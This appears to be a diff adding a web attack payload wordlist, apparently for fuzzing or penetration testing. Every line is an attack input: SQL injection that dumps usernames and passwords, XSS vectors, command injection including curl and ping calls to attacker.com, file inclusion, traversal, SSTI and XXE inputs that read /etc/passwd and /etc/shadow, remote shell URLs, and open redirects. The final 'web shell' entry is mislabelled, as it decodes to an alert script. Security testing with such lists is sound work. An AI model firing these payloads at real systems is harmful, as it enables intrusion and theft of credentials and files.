@@ -1,0 +1,104 @@
+# =======================
+# SQL Injection (SQLi)
+# =======================
+' OR 1=1 --
+" OR "1"="1
+admin' --
+admin'#
+' OR 'a'='a
+' OR 1=1 LIMIT 1; --
+' OR sleep(5)--
+1' ORDER BY 100 -- 
+1' AND 1=2 UNION SELECT null,null--
+' UNION SELECT username, password FROM users--
+
+# =======================
+# Cross-Site Scripting (XSS)
+# =======================
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<svg onload=alert(1)>
+<IMG SRC=javascript:alert(1)>
+<iframe src="javascript:alert('XSS')">
+<math><mtext></mtext><script>alert(1)</script></math>
+<marquee onstart=alert(1)>
+"><img src=x onerror=alert(1)>
+<video><source onerror="alert(1)">
+<body onload=alert(1)>
+<a href="javascript:alert(1)">X</a>
+
+# =======================
+# Command Injection
+# =======================
+; ls -la
+| whoami
+&& id
+|| ping -c 1 attacker.com
+`id`
+$(id)
+& net user
+; curl http://attacker.com
+
+# =======================
+# Local File Inclusion (LFI)
+# =======================
+../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+/etc/passwd
+/../../boot.ini
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+file:///etc/shadow
+
+# =======================
+# Remote File Inclusion (RFI)
+# =======================
+http://evil.com/shell.txt
+https://attacker.com/backdoor.php
+//attacker.com/shell.txt
+http://127.0.0.1:80/
+
+# =======================
+# Server-Side Template Injection (SSTI)
+# =======================
+{{7*7}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+<%= 7 * 7 %>
+${7*7}
+{{ self }}
+{% for c in [].__class__.__base__.__subclasses__() %}{{ c }}
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+
+# =======================
+# HTTP Header Injection
+# =======================
+test\r\nSet-Cookie: injected=1
+test%0d%0aSet-Cookie:%20hacked=1
+
+# =======================
+# XXE (XML External Entity)
+# =======================
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+
+# =======================
+# Open Redirect
+# =======================
+//evil.com
+https://evil.com
+?next=https://attacker.com
+?redirect=http://evil.com
+
+# =======================
+# Path Traversal + Null Byte
+# =======================
+../../../../etc/passwd%00
+..\\..\\..\\boot.ini
+C:\\windows\\win.ini
+
+# =======================
+# Base64-encoded Web Shell Payload (for testing WAF bypass)
+# =======================
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
